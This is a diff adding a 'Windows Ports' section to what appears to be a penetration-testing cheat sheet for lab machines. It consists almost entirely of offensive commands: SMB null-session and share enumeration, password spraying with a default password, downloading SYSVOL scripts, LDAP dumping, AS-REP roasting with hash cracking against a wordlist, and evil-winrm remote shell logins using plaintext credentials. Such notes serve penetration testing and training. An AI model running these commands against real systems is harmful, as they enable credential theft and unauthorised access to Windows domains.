@@ -33,6 +33,49 @@ https://www.gaijin.at/en/infos/windows-version-numbers
 https://github.com/SecWiki/windows-kernel-exploits.git
 ```
 
+### Windows Ports 
+
+__139__
+```
+rpcclient -U '' 10.10.10.x
+queryusergroups {user}
+```
+
+__135/445__
+```
+smbclient -L 10.10.10.10 -U "s.fris"
+smbmap -u "s.fris" -p "fr1s" -H feest.local
+./smbclient.py r.appel:kru1m3l@10.10.10.10
+smbclient.py s.fris:fr1@10.10.10.10
+crackmapexec smb 10.10.10.10.x --pass-pol -u '' -p ''
+crackmapexec smb 10.10.10.10.x -u userlist -p pwlist.txt
+crackmapexec smb 10.10.10.x -u {user} -p {pass}
+crackmapexec smb 10.10.10.x -u {user} -p {pass} --shares
+smbget -R smb://r.appel:kru1m3l@10.10.10.10/SYSVOL/feest.local/Scripts
+smbget -R smb://s.fris:fris@10.10.10.10/Audit
+cat users.grep | while read line; do smbclient.py "$line":Welkom01@10.10.10.182 ;done
+
+mkdir /mnt/data
+mount -t cifs -o user=r.appel //10.10.10.10/data /mnt/data
+```
+
+__LDAP 389__
+```
+ldapsearch -h 10.10.10.10 -p 389 -x -b DC=fris,DC=local
+```
+
+__Kerberos 88__
+```
+GetNPUsers.py -dc 10.10.10.x -request 'htb.local/' -format hashcat
+hashcat -m 18200 hashes/{name} /usr/share/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
+```
+
+__WINRM 5985__
+```
+ruby evil-winrm.rb -i 10.10.10.10 -u s.appel -p 'fr1s'
+```
+
+
 #### Gather info
 __cmd.exe__
 ```
